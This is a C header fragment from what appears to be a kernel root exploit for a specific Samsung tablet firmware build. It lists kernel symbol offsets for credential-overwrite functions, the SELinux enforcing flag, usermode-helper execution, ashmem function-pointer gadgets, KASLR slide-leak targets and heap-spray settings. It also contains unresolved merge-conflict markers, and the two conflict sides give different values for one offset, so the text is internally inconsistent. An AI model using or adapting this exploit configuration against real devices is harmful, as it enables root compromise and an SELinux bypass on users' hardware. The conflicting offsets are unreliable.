...
#define BUILD_VARIANT_LABEL "gts9fewifi-X510XXSEEZG3-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "gts9fewifi-X510XXSEEZG3-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
 "samsung/gts9fewifixx/gts9fewifi:16/BP4A.251205.006/X510XXSEEZG3:user/release-keys"
#endif
 ...
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "gts9fewifi-X510XXSEEZG3-app"
...
>>>>>>> b7a854e (V4: FPSIMD route fully working on gts9fewifi-X510XXSEEZG3)
...
#define INIT_TASK_OFF             0x0239fd80ULL      // unchanged
// Credential offsets – corrected from EZG3 ELF
#define PREPARE_KERNEL_CRED_OFF   0x00113a88ULL      // was 0x0011e3c8
#define COMMIT_CREDS_OFF          0x00113330ULL      // was 0x00120104
#define OVERRIDE_CREDS_OFF        0x00113718ULL      // was 0x0011f1dc

#define ROOT_TASK_GROUP_OFF       0x02591f40ULL      // unchanged
#define SELINUX_ENFORCING_OFF     0x026654e8ULL      // unchanged
#define KMALLOC_CACHES_OFF        0x01b04c70ULL      // +0xc0
#define ANON_PIPE_BUF_OPS_OFF     0x01912de0ULL      // +0xc0
#define SYSTEM_UNBOUND_WQ_OFF     0x0238ae20ULL      // unchanged
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100eecULL // unchanged

#define ASHMEM_FOPS_OFF           0x01ab3c08ULL      // +0xc0
#define ASHMEM_MISC_FOPS_OFF      0x024ff750ULL      // TODO: verify (old value)
#define ASHMEM_IOCTL_OFF          0x00d026c0ULL      // unchanged
#define ASHMEM_COMPAT_IOCTL_OFF   0x00d02c78ULL      // unchanged
#define ASHMEM_MMAP_OFF           0x00d02cd0ULL      // unchanged
#define ASHMEM_OPEN_OFF           0x00d02f0cULL      // unchanged
#define ASHMEM_RELEASE_OFF        0x00d02f90ULL      // unchanged
#define ASHMEM_SHOW_FDINFO_OFF    0x00d030b0ULL      // unchanged

#define CONFIGFS_READ_ITER_OFF    0x004759c4ULL      // unchanged
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00475e80ULL    // unchanged
#define COPY_SPLICE_READ_OFF      0x003fcb5cULL      // unchanged
#define NOOP_LLSEEK_OFF           0x003b1d24ULL      // unchanged
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00108668ULL 
#define SLIDE_PSELECT_WORD_SHIFT 3

#define SLIDE_USE_SETSO_SPRAY 1
#define SLIDE_SETSO_SPRAY_FAMILY AF_INET6
#define SLIDE_SETSO_SPRAY_LEVEL 0x29
#define SLIDE_SETSO_SPRAY_OPTNAME 43
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF     0x00ec8518ULL   // new (derived)
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF   0x023925a0ULL   // unchanged
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024be6f8ULL // TODO: verify (old value)
#define SLIDE_SYSCTL_BOOTID_OFF          0x0274a5c9ULL   // unchanged
...
<<<<<<< HEAD
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL          // must be tuned on device
#define P0_FINGERPRINT_HEADER "targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h"
#endif
 ...
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK_OFF 0x0239fd80ULL
#define PREPARE_KERNEL_CRED_OFF 0x00113a88ULL
#define COMMIT_CREDS_OFF 0x00113330ULL
#define OVERRIDE_CREDS_OFF 0x00113718ULL
#define ROOT_TASK_GROUP_OFF 0x02591f40ULL
#define SELINUX_ENFORCING_OFF 0x026654e8ULL
#define KMALLOC_CACHES_OFF 0x01b04c70ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01912de0ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0238ae20ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100eecULL

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_FOPS_OFF 0x01ab3c08ULL
#define ASHMEM_MISC_FOPS_OFF 0x024ff750ULL
#define ASHMEM_IOCTL_OFF 0x00d026c0ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00d02c78ULL
#define ASHMEM_MMAP_OFF 0x00d02cd0ULL
#define ASHMEM_OPEN_OFF 0x00d02f0cULL
#define ASHMEM_RELEASE_OFF 0x00d02f90ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00d030b0ULL
#define CONFIGFS_READ_ITER_OFF 0x004759c4ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00475e80ULL
#define COPY_SPLICE_READ_OFF 0x003fcb5cULL
#define NOOP_LLSEEK_OFF 0x003b1d24ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017fdc14ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x023925a0ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024be6f8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0274a5c9ULL
